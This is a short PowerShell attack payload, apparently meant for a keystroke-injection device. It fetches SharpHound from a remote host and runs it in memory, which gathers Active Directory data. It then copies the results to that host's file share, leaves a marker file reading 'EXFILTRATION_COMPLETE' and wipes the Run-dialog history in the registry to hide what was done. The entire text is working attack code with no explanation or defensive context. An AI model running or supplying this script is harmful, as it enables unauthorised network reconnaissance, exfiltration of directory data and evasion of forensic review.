IEX (New-object Net.Webclient).DownloadString('http://172.16.64.1/Sharphound.ps1');Invoke-Bloodhound -NoSaveCache -CompressData
move Blood* \\172.16.64.1\s\
New-Item -Path \\172.16.64.1\s -ItemType "file" -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit